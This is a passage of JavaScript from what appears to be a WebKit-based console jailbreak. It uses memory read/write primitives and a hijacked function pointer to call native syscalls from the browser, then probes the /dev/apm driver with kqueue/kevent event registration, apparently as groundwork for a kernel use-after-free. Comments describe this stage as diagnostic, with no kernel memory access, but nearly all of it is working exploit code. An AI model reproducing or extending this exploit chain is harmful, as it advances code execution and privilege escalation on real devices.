    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
    closeFd = (fd) => sc(SYS.close, fd).i32;
    function errno() {
      const r = callAddr(errorFn, []);
      const a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }
    if (MOCHI_DIAG && NATIVE_VALIDATE) mark("MOCHI-WEBKIT-COMPAT", "gadget-bytes=" + gated + "/" + GAD.length + " on-device-check=PASS full-module-identity=UNKNOWN");

    // Native verification is explicit and terminal. Neither this path nor its
    // cleanup performs kernel memory access. The v0.4.4 core/mem bytes remain frozen.
    function sameAddress(a, b) {
      return !!a && !!b && (a.low >>> 0) === (b.low >>> 0) && (a.hi >>> 0) === (b.hi >>> 0);
    }
    function restoreMainPointer() {
      if (!mainArmed) {
        mark("MOCHI-RESTORE", "state=NOT-ARMED");
        return true;
      }
      try {
        p.write8(mainMf, mainOrig);
        var readback = p.read8(mainMf);
        var verified = sameAddress(readback, mainOrig);
        mainArmed = !verified;
        mark("MOCHI-RESTORE", "function-pointer=" + (verified ? "VERIFIED" : "MISMATCH") + " readback-checked=true");
        if (!verified) mark("MOCHI-STOP", "code=NATIVE-RESTORE-MISMATCH");
        return verified;
      } catch (restoreError) {
        mark("MOCHI-STOP", "code=NATIVE-RESTORE-EXCEPTION detail=" + String(restoreError));
        return false;
      }
    }
    if (NATIVE_VALIDATE) {
      // Stage 4 fork: one bounded /dev/apm open/close. No kqueue, kevent,
      // ioctl, retry loop, race, kernel memory access or payload.
      // Refuse launch if the user came to the APM route directly (e.g. page restore).
      if (APM_REACH && !FROM_LANDING) {
        mark("MOCHI-APM", "REFUSED referrer-missing use-index-page no-syscalls-run");
        var notArmedRestored = restoreMainPointer();
        mark("MOCHI-TERMINAL", "mode=apm result=REFUSED restored=" + (notArmedRestored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
        state("APM diagnostic requires launch from index.html", "bad");
        allDone = true;
        try { clearInterval(watchdog); } catch (ignored) {}
        finishUI(false);
        return;
      }
      mark("MOCHI-STEP", "03 native-readonly-call starting: getpid/getuid; no kernel memory access");
      let nativePid = -1, nativeUid = -1, nativeError = null;
      try {
        nativePid = sc(SYS.getpid).i32;
        nativeUid = sc(SYS.getuid).i32;
      } catch (error) {
        nativeError = error;
        mark("MOCHI-STOP", "code=NATIVE-CALL-EXCEPTION detail=" + String(error));
      }
      // Stage 5: exactly one APM event registration and explicit deletion.
      // No event polling, notifications, races, ioctl, spray or kernel memory access.
      // If attach fails, the failure/errno is evidence, not an exploit verdict.
      let apmFd = -1, apmOpenErrno = null, apmClose = null, apmError = null;
      let eventVerdict = "NOT-RUN", kqFd = -1, evAddRc = null, evDeleteRc = null;
      let evAddErrno = null, evDeleteErrno = null, kqCloseRc = null;
      if (APM_REACH && nativeError === null) {
        mark("MOCHI-APM", APM_EVENTS
          ? "BEGIN one-event-lifecycle open->register->delete->close no-race no-kernel-rw"
          : "BEGIN single-open-close path=/dev/apm event-registration=no ioctl=no kernel-write=no");
        try {
          const pathString = "/dev/apm";
          const pathBuffer = new ArrayBuffer(16);
          const pathView = new Uint8Array(pathBuffer);
          for (let i = 0; i < pathString.length; ++i) pathView[i] = pathString.charCodeAt(i);
          pathView[pathString.length] = 0;
          keepAlive.push(pathBuffer, pathView);
          apmFd = sc(SYS.open, bufAddr(pathBuffer), 0, 0).i32;
          if (apmFd < 0) {
            apmOpenErrno = errno();
            mark("MOCHI-APM", "OPEN-FAILED fd=" + apmFd + " errno=" + apmOpenErrno);
            eventVerdict = "OPEN-FAILED";
          } else {
            mark("MOCHI-APM", "OPEN-OK descriptor-acquired");
            if (APM_EVENTS) {
              kqFd = sc(SYS.kqueue).i32;
              if (kqFd < 0) {
                const e = errno();
                mark("MOCHI-EVENT", "KQUEUE-FAILED fd=" + kqFd + " errno=" + e);
                eventVerdict = "QUEUE-FAILED";
              } else {
                mark("MOCHI-EVENT", "KQUEUE-OK descriptor-acquired");
                // FreeBSD/Orbis amd64 struct kevent: 8+2+2+4+8+8 = 32 bytes.
                const evBuf = new ArrayBuffer(32), evView = new DataView(evBuf);
                keepAlive.push(evBuf, evView);
                const evAddr = bufAddr(evBuf);
                function setEvent(flag) {
                  for (let i = 0; i < 32; i += 4) evView.setUint32(i, 0, true);
                  evView.setUint32(0, apmFd >>> 0, true); // ident=fd, high half zero
                  evView.setInt16(8, -1, true);           // EVFILT_READ
                  evView.setUint16(10, flag, true);       // EV_ADD / EV_DELETE
                }
                setEvent(0x0001); // EV_ADD, no EV_CLEAR, no event polling
                evAddRc = sc(SYS.kevent, kqFd, evAddr, 1, 0, 0, 0).i32;
                if (evAddRc < 0) {
                  evAddErrno = errno();
                  eventVerdict = "REGISTRATION-REFUSED";
                  mark("MOCHI-EVENT", "REGISTER-REFUSED rc=" + evAddRc + " errno=" + evAddErrno);
                } else {
                  mark("MOCHI-EVENT", "REGISTER-OK rc=" + evAddRc + " filter=READ flags=ADD");
                  // Explicitly detach before either descriptor is closed.
                  setEvent(0x0002); // EV_DELETE
                  evDeleteRc = sc(SYS.kevent, kqFd, evAddr, 1, 0, 0, 0).i32;
                  if (evDeleteRc < 0) {
                    evDeleteErrno = errno();
                    eventVerdict = "DELETE-FAILED";
                    mark("MOCHI-EVENT", "DELETE-FAILED rc=" + evDeleteRc + " errno=" + evDeleteErrno);
                  } else {
                    eventVerdict = "REGISTER-DELETE-PASS";
                    mark("MOCHI-EVENT", "DELETE-OK rc=" + evDeleteRc);
                  }
                }
              }
            }
          }
        } catch (e) {
          apmError = "OPERATION-EXCEPTION " + String(e);
          eventVerdict = "EXCEPTION";
          mark("MOCHI-APM", apmError);
        } finally {
          // Close kqueue first to release registered events if DELETE failed.
          if (kqFd >= 0) {
            try {
              kqCloseRc = sc(SYS.close, kqFd).i32;
              mark("MOCHI-EVENT", "QUEUE-CLOSE rc=" + kqCloseRc);
            } catch (e) {
              apmError = "QUEUE-CLOSE-EXCEPTION " + String(e);
              eventVerdict = "CLEANUP-FAILED";
              mark("MOCHI-EVENT", apmError);
            }
          }
          if (apmFd >= 0) {
            try {
              apmClose = sc(SYS.close, apmFd).i32;
              mark("MOCHI-APM", "CLOSE-RESULT rc=" + apmClose + " one-descriptor-only");
            } catch (e) {
              apmError = "CLOSE-EXCEPTION " + String(e);
              eventVerdict = "CLEANUP-FAILED";
              mark("MOCHI-APM", apmError);
            }
          }
        }
      }
      var restored = restoreMainPointer();
      var valid = nativeError === null && nativePid > 0 && nativeUid >= 0;
      if (nativeError === null) {
        mark("MOCHI-NATIVE", "getpid=" + nativePid + " getuid=" + nativeUid + " meaning=userland-syscalls-only");
        if (!valid) mark("MOCHI-STOP", "code=NATIVE-CALL-BAD-RETURN pid=" + nativePid + " uid=" + nativeUid);
      }
      if (APM_REACH) {
        const reachable = apmFd >= 0 && apmClose === 0 && !apmError && valid && restored;
        const eventComplete = eventVerdict === "REGISTER-DELETE-PASS" && kqCloseRc === 0 && reachable;
        const label = APM_EVENTS
          ? (eventComplete ? "LIFECYCLE-PASS" : (eventVerdict === "NOT-RUN" ? "FAILED" : eventVerdict))
          : (reachable ? "REACHABLE" : (apmFd < 0 && apmOpenErrno !== null ? "DENIED-OR-MISSING" : "FAILED"));
        mark(APM_EVENTS ? "MOCHI-EVENT" : "MOCHI-APM", "VERDICT=" + label + " UAF=NOT-TESTED kernel-rw=NOT-TESTED kernel-exec=NOT-TESTED");
        mark("MOCHI-TERMINAL", "mode=" + (APM_EVENTS ? "apm-events" : "apm") + " result=" + label + " restored=" + (restored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
        state(APM_EVENTS ? (eventComplete ? "APM event registration/removal passed; UAF not tested" : "APM event lifecycle incomplete: " + label) : (reachable ? "APM driver reachable; UAF not tested" : "APM reachability inconclusive or denied"), (APM_EVENTS ? eventComplete : reachable) ? "good" : "bad");
      } else {
        if (valid && restored) mark("NATIVE-ONLY-PASS", "getpid/getuid succeeded; function-pointer-restored-and-verified; kernel-not-tested");
        mark("MOCHI-TERMINAL", "mode=native result=" + (valid && restored ? "PASS" : "FAIL") + " restored=" + (restored ? "VERIFIED" : "NOT-VERIFIED") + " kernel=no");
        state(valid && restored ? "Native userland calls passed; kernel untested" : "Native validation failed", valid && restored ? "good" : "bad");
      }
      allDone = true;
      try { clearInterval(watchdog); } catch (ignored) {}
      finishUI(APM_REACH ? (APM_EVENTS ? (eventVerdict === "REGISTER-DELETE-PASS" && kqCloseRc === 0 && apmFd >= 0 && apmClose === 0 && !apmError && valid && restored) : (apmFd >= 0 && apmClose === 0 && !apmError && valid && restored)) : (valid && restored));
      return;
    }
    // Fail closed if a future change bypasses the explicit mode branches.
    mark("MOCHI-STOP", "code=UNHANDLED-MODE kernel-not-tested");
    allDone = true;
    try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; } } catch (ignored) {}
    try { clearInterval(watchdog); } catch (ignored) {}
    finishUI(false);
  } catch (eOuter) {
    if (mainArmed && p && mainMf && mainOrig) {
      try {
        p.write8(mainMf, mainOrig);
        var endValue = p.read8(mainMf);
        var verified = (endValue.low >>> 0) === (mainOrig.low >>> 0) && (endValue.hi >>> 0) === (mainOrig.hi >>> 0);
        mainArmed = !verified;
        mark("MOCHI-RESTORE", "after-exception=" + (verified ? "VERIFIED" : "MISMATCH"));
      } catch (cleanupError) {
        mark("MOCHI-STOP", "code=EXCEPTION-CLEANUP-FAILED detail=" + String(cleanupError));
      }
    }
    allDone = true;
    try {
      mark("JB-THREW", (eOuter && (eOuter.stack || eOuter.message)) || String(eOuter));
      if (MOCHI_DIAG) mark("MOCHI-STOP", "code=USERLAND-JS-EXCEPTION; no-kernel-operation");
    } catch (ignored) {}
    try { clearInterval(watchdog); } catch (ignored) {}
    showRetry();
  }
})();
